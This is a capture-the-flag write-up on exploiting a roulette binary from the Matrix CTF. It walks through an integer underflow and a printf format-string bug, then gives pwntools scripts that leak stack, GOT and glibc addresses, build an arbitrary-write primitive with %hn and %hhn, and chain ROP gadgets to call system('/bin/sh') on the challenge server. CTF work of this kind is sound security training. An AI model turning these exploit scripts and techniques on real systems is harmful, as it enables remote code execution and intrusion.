This writeup describes how I've managed to pull off an unintended solution for Matrix CTF pwn challenge.

Lets run the binary to understand its basic functionality:

![legitimate_way](https://user-images.githubusercontent.com/45107680/113338694-1e3e9d80-9332-11eb-9194-6b96fed6b30a.png)

It looks like the program randomizes a number and if it's not equal to the bet, the program terminates.

There is no way to understand properly the binary functionality, so lets reverse engineer it. Here is a decompiled ```main``` function:
```
undefined8 main(void)

{
  int iVar1;
  ssize_t sVar2;
  uint local_4c;
  ulong local_48;
  int local_3c;
  long local_38;
  uint local_30;
  undefined4 local_2c;
  uint *local_28;
  undefined8 local_20;
  char *local_18;
  int local_c;
  
  local_18 = (char *)0x0;
  local_20 = 0;
  local_28 = (uint *)0x0;
  local_2c = 0;
  local_48 = 2;
  local_4c = 0;
  local_30 = 0;
  local_38 = 0;
  local_28 = (uint *)malloc(4);
  *local_28 = 1;
  local_38 = time((time_t *)0x0);
  srand((uint)local_38);
  iVar1 = genrate_random_number(1000,10000);
  local_38 = local_38 + iVar1;
  srand((uint)local_38);
  fflush(stdout);
  puts("Welcome to Casino Royal");
  fflush(stdout);
  printf("This is a roulette game\nYou have %d point to start with.\n",(ulong)*local_28);
  fflush(stdout);
  puts("How many games would you like to play(Up to 2)?");
  fflush(stdout);
  iVar1 = __isoc99_scanf(&DAT_00102090,&local_48);
  if (iVar1 == 1) {
    fflush(stdin);
    if ((local_48 < 3) || (local_48 == 0xffffffffffffffff)) {
      local_c = 0;
      while ((ulong)(long)local_c < local_48) {
        puts("Choose your bet (1-36)");
        fflush(stdout);
        iVar1 = __isoc99_scanf(&DAT_001020f1,&local_4c);
        if (iVar1 != 1) {
          printf("Something went wrong!");
          fflush(stdout);
        }
        fflush(stdin);
        if (((int)local_4c < 1) || (0x24 < (int)local_4c)) {
          if (local_4c == 0x31519) {
            puts(
                "Please enter your command (it will be printed to make sure you entered the rightone):"
                );
            fflush(stdout);
            local_18 = (char *)malloc(0x40);
            sVar2 = read(0,local_18,0x40);
            local_3c = (int)sVar2;
            fflush(stdout);
            if (local_3c == -1) {
              puts("something went wrong with your command");
              fflush(stdout);
            }
            printf(local_18);
            fflush(stdout);
            free(local_18);
            goto LAB_00101588;
          }
          puts("Bet is out of range... choose another");
          fflush(stdout);
        }
        else {
          local_30 = genrate_random_number(1,0x24);
          printf("num is : %d\n",(ulong)local_30);
          fflush(stdout);
          if (local_30 != local_4c) {
            puts("The house always wins... Bye!");
            fflush(stdout);
            free(local_28);
            return 0;
          }
          *local_28 = *local_28 * 0x24;
          printf("You won this round\nPoints: %d\n",(ulong)*local_28);
          fflush(stdout);
LAB_00101588:
          if (10000000 < (int)*local_28) {
            free(local_28);
            puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
            fflush(stdout);
            return 0;
          }
        }
        local_c = local_c + 1;
      }
    }
    else {
      puts("You\'re trying to trick me! I\'m leaving...");
      fflush(stdout);
    }
  }
  else {
    puts("Something went wrong!");
    fflush(stdout);
  }
  return 0;
}
```
Lets rename variables in order to get prettier pseudo-code:
```
undefined8 main(void)

{
  int randomized_num;
  ssize_t bytes_read;
  uint bet;
  ulong games_cnt;
  int tmp_bytes_read;
  long time_since_epoch;
  uint another_randomized_num;
  undefined4 local_2c;
  uint *points;
  undefined8 local_20;
  char *command;
  int loop_idx;
  
  command = (char *)0x0;
  local_20 = 0;
  points = (uint *)0x0;
  local_2c = 0;
  games_cnt = 2;
  bet = 0;
  another_randomized_num = 0;
  time_since_epoch = 0;
  points = (uint *)malloc(4);
  *points = 1;
  time_since_epoch = time((time_t *)0x0);
  srand((uint)time_since_epoch);
  randomized_num = genrate_random_number(1000,10000);
  time_since_epoch = time_since_epoch + randomized_num;
  srand((uint)time_since_epoch);
  fflush(stdout);
  puts("Welcome to Casino Royal");
  fflush(stdout);
  printf("This is a roulette game\nYou have %d point to start with.\n",(ulong)*points);
  fflush(stdout);
  puts("How many games would you like to play(Up to 2)?");
  fflush(stdout);
  randomized_num = __isoc99_scanf(&DAT_00102090,&games_cnt);
  if (randomized_num == 1) {
    fflush(stdin);
    if ((games_cnt < 3) || (games_cnt == 0xffffffffffffffff)) {
      loop_idx = 0;
      while ((ulong)(long)loop_idx < games_cnt) {
        puts("Choose your bet (1-36)");
        fflush(stdout);
        randomized_num = __isoc99_scanf(&DAT_001020f1,&bet);
        if (randomized_num != 1) {
          printf("Something went wrong!");
          fflush(stdout);
        }
        fflush(stdin);
        if (((int)bet < 1) || (0x24 < (int)bet)) {
          if (bet == 0x31519) {
            puts(
                "Please enter your command (it will be printed to make sure you entered the rightone):"
                );
            fflush(stdout);
            command = (char *)malloc(0x40);
            bytes_read = read(0,command,0x40);
            tmp_bytes_read = (int)bytes_read;
            fflush(stdout);
            if (tmp_bytes_read == -1) {
              puts("something went wrong with your command");
              fflush(stdout);
            }
            printf(command);
            fflush(stdout);
            free(command);
            goto LAB_00101588;
          }
          puts("Bet is out of range... choose another");
          fflush(stdout);
        }
        else {
          another_randomized_num = genrate_random_number(1,0x24);
          printf("num is : %d\n",(ulong)another_randomized_num);
          fflush(stdout);
          if (another_randomized_num != bet) {
            puts("The house always wins... Bye!");
            fflush(stdout);
            free(points);
            return 0;
          }
          *points = *points * 0x24;
          printf("You won this round\nPoints: %d\n",(ulong)*points);
          fflush(stdout);
LAB_00101588:
          if (10000000 < (int)*points) {
            free(points);
            puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
            fflush(stdout);
            return 0;
          }
        }
        loop_idx = loop_idx + 1;
      }
    }
    else {
      puts("You\'re trying to trick me! I\'m leaving...");
      fflush(stdout);
    }
  }
  else {
    puts("Something went wrong!");
    fflush(stdout);
  }
  return 0;
}
```
The program sets a time seed and then queries for an amount of roulette games to play. Now, pay attention to this piece of code ```if ((games_cnt < 3) || (games_cnt == 0xffffffffffffffff))```.
The type of 'games_cnt' is unsigned long, so if I pass '-1', ```games_cnt``` will be equal to ```0xffffffffffffffff```. Looks like an integer underflow issue that may be used in exploitation, who knows ;)

And yes, a few lines later on, there is a loop ```while ((ulong)(long)loop_idx < games_cnt)```, so passing '-1' to ```games_cnt``` variable allows me to play ```2^64 - 1``` games, which is more than enough :)

After that, I need to choose a bet: ```randomized_num = __isoc99_scanf(&DAT_001020f1,&bet);```. BTW, ```randomized_num``` variable is reused here to check scanf return value, so don't pay attention to the variable name.
And here is the main bug that makes the program exploitable:
```
command = (char *)malloc(0x40); <- !
bytes_read = read(0,command,0x40); <- !!
tmp_bytes_read = (int)bytes_read;
fflush(stdout);
if (tmp_bytes_read == -1) {
  puts("something went wrong with your command");
  fflush(stdout);
}
printf(command); <- !!!
```
```command``` buffer is allocated on heap, afterwards I can write arbitrary 64 bytes to the buffer aaaand... pass it to ```printf``` function as is! I can fully control the format string content, so this is a format string vulnerability.
In order to reach the command input prompt, the following condition needs to be true: ```if (bet == 0x31519)```, so ```bet``` needs to be equal to ```202009``` in decimal.

Lets re-execute the program and check it out:

![fmt_string_demo](https://user-images.githubusercontent.com/45107680/113338933-76759f80-9332-11eb-8ba4-63d433e20efe.png)

Oh yes! I can leak data from stack which gives me an information leak that can be used for defeating ASLR. Sweet! Now, how to gain arbitrary write primitive? 
```printf``` has ```%n``` conversion specifier that is very interesting from exploitation point of view. According to the ```printf``` man page:
```
n             The number of characters written so far is stored into the integer pointed to by the corresponding argument.  That argument shall be an int *, or variant
              whose size matches the (optionally) supplied integer length modifier.  No argument is converted.  (This specifier is not supported by the  bionic  C  li‐
              brary.)  The behavior is undefined if the conversion specification includes any flags, a field width, or a precision.
```
The number of characters written so far is stored into the integer pointed to by the corresponding argument. Furthermore, I can reference the particular format string argument via a dollar sign ```$```.
For example, this format string: ```%4919x12$n``` writes ```0x1337``` (4919 in decimal) to the address at 12th position in format string, which is ```0x55998ee452a0``` according to the previous screenshot.

Lets take a look at the execution state (in this case, registers and stack content) more precisely using GDB:

![regs](https://user-images.githubusercontent.com/45107680/113339555-4f6b9d80-9333-11eb-9c1e-86947cb5aeeb.png)

![stack_content_and_leaked_data](https://user-images.githubusercontent.com/45107680/113340360-77a7cc00-9334-11eb-8c2d-58fe07aca9b2.png)

The binary is 64 bit, according to x86_64 calling conventions, the first 6 arguments are passed via registers (rdi, rsi, rdx, rcx, r8, r9 - in this order) and the rest are passed via stack.
```rdi``` contains the format string address, so the first 5 leaked values are stored in ```rsi```, ```rdx```, ```rcx```, ```r8``` and ```r9``` registers (in this order). Stack content starts from 6th leaked value as described on the screenshot above.

Lets try to write 0x1337 at address ```0x5555555592a0``` which is at 12th position among leaked values using previously described format string. 
This is the value at address ```0x5555555592a0``` before the given command is executed:

![before_write](https://user-images.githubusercontent.com/45107680/113340695-e2f19e00-9334-11eb-82e3-e3fcb23b5470.png)

Let the printf execute the crafted format string. Lets check this address content once again:

![after_write](https://user-images.githubusercontent.com/45107680/113340709-e84ee880-9334-11eb-9aee-634dbb51fe2a.png)

I've gained somewhat arbitrary write primitive! Format string vulnerability gives 2 primitives - read AND write, which is very powerful. Moreover, I can write data byte-by-byte via ```$hhn``` specifier or 2 bytes at a time via ```%hn``` specified. Both of them will be used further. But how to use it to exploit the binary?
There is a piece of code that seems to print a real flag:
```
if (10000000 < (int)*points) {
    free(points);
    puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
    fflush(stdout);
    return 0;
}
```
In an intended solution it seems like I need to overwrite the value which is pointed by the ```points``` pointer. If this memory is overwritten with value that is greater than 10000000, the flag is printed out.
Meh, it looks too boring ;) I've decided not to be boring but creative and gain remote code execution on the server that hosts this challenge and pop a remote shell.

First of all, need to check the mitigations applied for the given binary:

![mitigations](https://user-images.githubusercontent.com/45107680/113340912-2ba95700-9335-11eb-9547-6fa632830962.png)

Partial RELRO means that GOT is still writable, so maybe I'll go for GOT overwrite (spoiler: no :D). NX means that all virtual memory pages in the process cannot be writable and executable in the same time, so I cannot trivially jump to an injected shellcode.
PIE means that the binary is position-independent, which allows to load binary image at random addresses every execution.

I need to build a primitive that allows me to write, ideally, at any address in the process. I can write a ROP chain into a stack and rewrite the return address from the ```main``` stack frame to the ROP chain start.
But first of all, as I've already mentioned, I need to build a comfortable write-what-where primitive for it. Lets write a short script that will allow to leak the first 100 values from a stack:
```
from pwn import *

conn = remote('challenges.ctfd.io', 30426)

# init
conn.recvuntil(b'?')
conn.sendline(b'-1')
conn.recvuntil(b')')
conn.sendline(b'202009')
conn.recvuntil(b':\n')

for idx in range(1, 101):
    conn.sendline('#{}: %{}$p'.format(idx, idx).encode())
    leaked_value = conn.recvline()
    print(leaked_value.decode())
    conn.recvline()
    conn.sendline(b'202009')
    conn.recvuntil(b':\n')
```
Take a look at stack content and take a moment in order to understand how addresses on a stack can suit the exploitation and gaining WWW primitive.

Pay attention at stack addresses that are leaked from a stack. I've found a stack address which points to another stack address. After running the previously mentioned script, I've spotted several interesting stack addresses stored on a stack, one of them at offset #33. Let's upgrade the script to write at ```0x1337``` at address pointed by offset #33:
```
from pwn import *

conn = remote('challenges.ctfd.io', 30426)

def leak_stack_values(values_cnt):
    for idx in range(1, values_cnt + 1):
        conn.sendline('#{}: %{}$p'.format(idx, idx).encode())
        leaked_value = conn.recvline()
        print(leaked_value.decode())
        conn.recvline()
        conn.sendline(b'202009')
        conn.recvuntil(b':\n')

# init
conn.recvuntil(b'?')
conn.sendline(b'-1')
conn.recvuntil(b')')
conn.sendline(b'202009')
conn.recvuntil(b':\n')

log.info("Before writing 0x1337 at address stored at index #33")
leak_stack_values(100)

conn.sendline(b'%4919x%33$hn')
log.info("After writing 0x1337 at address stored at index #33")
conn.recvuntil(b')\n')
conn.sendline(b'202009')
conn.recvuntil(b':\n')

leak_stack_values(100)
```
After running the script and carefully looking at the output, I've spotted the destination offset:
Before arbitrary stack write:
```
#47: 0x7ffc4ceb1fe3
```
After arbitrary stack write:
```
#47: 0x7ffc4ceb1337 
```
Woohoo! #33 points at stack entry at offset #47. Perfect, so I can use a pointer at #33 to control a value stored in stack entry at offset #47.
So arbitrary write primitive looks like that:

![pointers_hierarchy](https://user-images.githubusercontent.com/45107680/113341117-72974c80-9335-11eb-9b3b-8d5f138313db.jpg)

I use a master pointer (which is immutable because I cannot control its value) to change an address stored at offset #47. So I can set a pointer stored at offset #47 to point at any stack address.
It begins to look nasty :) Roughly, I use a master pointer in order to increment/decrement a slave pointer at offset #47 through which I can write a ROP payload at arbitrary memory on a stack.
So, I can calculate the offset of the stack entry which contains return address from main function stack frame, find suitable ROP gadgets and inject a ROP payload overriding the return address from a main stack frame with an address of the first gadget. 
Afterwards, I force the program to return from main function which causes the ROP chain to execute and pop a n1c3 5h311 for me :)

The plan looks super exciting, but due to ASLR+PIE I have no idea about addresses of functions, ROP gadgets etc. As you can see, I've managed to leak a lot of different addresses from a stack.

Play around with GDB and be sure you know the exact process memory layout in Linux in order to be able to predict which address belongs to what. 

Results: 
```
Offset #17 - return address from a main stack frame, this stack entry needs to be overridden with a first ROP gadget address. 
Offset #21 - arbitrary address from the binary image. Just calculate the offset from the binary image load address (0x11f1). Once I know at which address a binary image has been loaded, I can calculate an address of everything in the binary image. I'll use it for calculating ROP gadgets' addresses and GOT entries addresses for more leaks.
Offset #33 - master pointer
Offset #47 - slave pointer
Offset #53 - this offset has been chosen arbitrarily (doesn't really matter, it just needs to be a valid stack entry), it will be used to write arbitrary pointers into it to be dereferenced for read/write further.
```
Now, I need to find gadgets that allow me to construct a payload which computationally equals to ```execve("/bin/sh", NULL, NULL)``` or ```system("/bin/sh")```.
Bad news, there are no ```syscall``` gadgets in the binary, so I cannot trigger syscalls via a ROP chain. So, I need to know the address of ```system``` and the address of "/bin/sh" string.
But there is a problem, I don't know which libc version is used on the remote server. How to figure it out? Take a couple of minutes to think about it before you continue...

Ok, I've leaked a binary image base address. Thus, I can calculate the GOT address and libc functions' addresses that have been used during the program execution.
Knowing the GOT address, I can leak ```printf``` and ```puts``` GOT entries and then use the previously described pointer hierarchy in order to dereference GOT entries and leak glibc addresses.

Now the script needs to be updated. Follow the given script:
```
from pwn import *

ARBITRARY_BIN_IMG_ADDR_OFFSET = 21
MASTER_POINTER_OFFSET = 33
SLAVE_POINTER_OFFSET = 47
DESTINATION_STACK_ENTRY_OFFSET = 53

PUTS_GOT_ENTRY_OFFSET = 0x4020
PRINTF_GOT_ENTRY_OFFSET = 0x4028

conn = remote('challenges.ctfd.io', 30426)

def init():
    conn.recvuntil(b'?', timeout=5).decode()
    conn.sendline(b'-1')
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

def leak_stack_data_at_offset(offset):
    conn.sendline('%{}$p'.format(offset).encode())
    conn.recvline().decode()
    leaked_value = conn.recvline().decode()[:-1]
    conn.recvuntil(b')', timeout=5)
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()
    result = 0
    try:
        result = int(leaked_value, 16)
    except ValueError:
        return 0
    return result

# overwrites word (2 bytes) at address of the leaked pointer from a stack
def overwrite_word(offset_to_dereference, word):
    conn.sendline(('%{}x%{}$hn'.format(word, offset_to_dereference)).encode())
    conn.recvline().decode()
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

# overwrites byte at address of the leaked pointer from a stack
def overwrite_byte(offset_to_dereference, byte):
    conn.sendline(('%{}x%{}$hhn'.format(byte, offset_to_dereference)).encode())
    conn.recvline().decode()
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

# writes data with arbitrary length byte-by-byte at address pointed by a pointer in "slave offset"
def write_arbitrary_data(master_ptr_offset, slave_ptr_offset, data):
    saved_slave_ptr = leak_stack_data_at_offset(slave_ptr_offset)

    last_word = saved_slave_ptr & 0xffff

    while data != 0:
        byte_to_write = data & 0xff
        data >>= 8
        overwrite_byte(slave_ptr_offset, byte_to_write)
        last_word += 0x1
        overwrite_word(master_ptr_offset, last_word)

    overwrite_word(master_ptr_offset, saved_slave_ptr & 0xffff)

# dereferences the pointer stored on stack (be careful, it the stored pointer is invalid, the program will crash)
def dereference_at_offset(offset):
    conn.sendline(('%{}$s'.format(offset)).encode())
    conn.recvline().decode()
    leaked_value = conn.recvline()[:-1]

    container = []

    for byte in leaked_value:
        container.append(byte)

    result = 0 & 0xff

    for byte in container[::-1]:
        result |= byte
        result <<= 8

    result >>= 8
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()
    return result & 0xffffffffffff

init()
# align leaked slave pointer value
slave_pointer = leak_stack_data_at_offset(MASTER_POINTER_OFFSET)
slave_pointer += 48
overwrite_word(MASTER_POINTER_OFFSET, slave_pointer & 0xffff)

# leak binary image addresses
log.info("Leaked arbitrary binary image address -> {}".format(hex(leak_stack_data_at_offset(ARBITRARY_BIN_IMG_ADDR_OFFSET))))
bin_img_base_addr = leak_stack_data_at_offset(ARBITRARY_BIN_IMG_ADDR_OFFSET) - 0x11f1
puts_got_entry_addr = bin_img_base_addr + PUTS_GOT_ENTRY_OFFSET
printf_got_entry_addr = bin_img_base_addr + PRINTF_GOT_ENTRY_OFFSET

log.info("Calculated binary image base address: " + hex(bin_img_base_addr))
log.info("Calculated printf() GOT entry: " + hex(printf_got_entry_addr))
log.info("Calculated puts() GOT entry: " + hex(puts_got_entry_addr))

# leak glibc addresses
write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, printf_got_entry_addr)
printf_glibc_addr = dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)
log.info("Leaked printf() glibc address: " + hex(dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)))
write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, puts_got_entry_addr)
puts_glibc_addr = dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)
log.info("Leaked puts() glibc address: " + hex(dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)))
```
![glibc_leak](https://user-images.githubusercontent.com/45107680/113341484-e20d3c00-9335-11eb-8dfa-4d34e6ca7e16.png)

As you can see, ```printf``` has in-page offset that equals to ```0xd70```, ```puts``` in-page offset is ```0x490```. Enter this data into the libc database:

![libc_database_init_info](https://user-images.githubusercontent.com/45107680/113341607-049f5500-9336-11eb-9493-b85aa18ae803.png)

Aha! The remote server has glibc version 2.30, now I can use this information to find an offset to ```system``` function and to ```str_bin_sh``` string which is "/bin/sh".

![libcbase_offsets](https://user-images.githubusercontent.com/45107680/113341751-387a7a80-9336-11eb-9931-8495abb62d11.png)

Perfect! I can calculate the address of ```system``` and ```str_bin_sh```. I need to run ```system("/bin/sh")```, so according to x86_64 calling conventions, "/bin/sh" address needs to be stored in ```rdi``` register.
It hints me about what ROP gadgets I need to search for. ROP chain needs to look like this (spoiler: it's slightly incomplete, but will be fixed further):

![incomplete_rop_payload](https://user-images.githubusercontent.com/45107680/113342755-8a6fd000-9337-11eb-82ae-d778023ecdf8.png)

Use ```ropshell.com```, ROPgadget, ropper or any other tool aimed for spotting interesting ROP gadgets in binaries.

Now I need to calculate the address of a stack entry where the return address from main stack frame is stored. I can do that, because I know the offset of slave pointer and I can leak its address via master pointer.
Knowing the address and the offset, I can calculate address of any stack entry. Return address is stored in stack entry at offset #17, so I need to start to inject ROP payload from there.

This is how ROP payload injection looks like:

![rop_payload_injection](https://user-images.githubusercontent.com/45107680/113344417-b9874100-9339-11eb-9a6b-34ef5dae6c36.png)

Everything is correct, but it fails. I've spent a bit of time figuring out why my payload fails to pop the remote shell. The answer is - the stack is unaligned and when I try to call ```system```, it lands on a wrong address.
I've used ```ret``` gadget trick for stack realignment during the ROP payload execution and it worked like a charm. So the final ROP payload which is written to stack according to the above mentioned scheme looks like that:

![complete_rop_payload](https://user-images.githubusercontent.com/45107680/113343234-3a453d80-9338-11eb-8de8-54b52bc886c1.png)

For full exploit source code check ```roulette_exploit.py``` file.

RCE looks 1337 as always :D 

![rce0](https://user-images.githubusercontent.com/45107680/113344636-023efa00-933a-11eb-9f54-31b11ca08275.png)

![rce1](https://user-images.githubusercontent.com/45107680/113344653-066b1780-933a-11eb-8e86-5cc88952cb70.png)

Finally, lets grep out the real flag from a remote binary actually BEING on a remote server :) :

![rce2](https://user-images.githubusercontent.com/45107680/113344661-0a973500-933a-11eb-933d-f76194773dac.png)

Thanks to Matrix cyber security company for providing this challenge.
